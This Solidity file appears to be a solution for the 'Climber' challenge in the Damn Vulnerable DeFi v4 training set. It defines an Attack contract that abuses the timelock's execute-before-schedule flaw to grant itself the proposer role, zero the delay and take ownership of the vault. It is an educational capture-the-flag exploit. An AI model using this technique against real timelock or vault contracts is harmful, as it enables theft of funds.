// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attack {
    address payable immutable private timelock;

    uint256[] private _values = [0,0,0,0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(
        address payable _timelock,
        address _vault
    ) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));

        _elements[1] = (abi.encodeWithSignature("updateDelay(uint64)", 0));
        _elements[2] = (abi.encodeWithSignature("transferOwnership(address)", msg.sender));
        _elements[3] = (abi.encodeWithSignature("timelockSchedule()"));
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, "bytes32(123)");
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, "bytes32(123)");
    }
}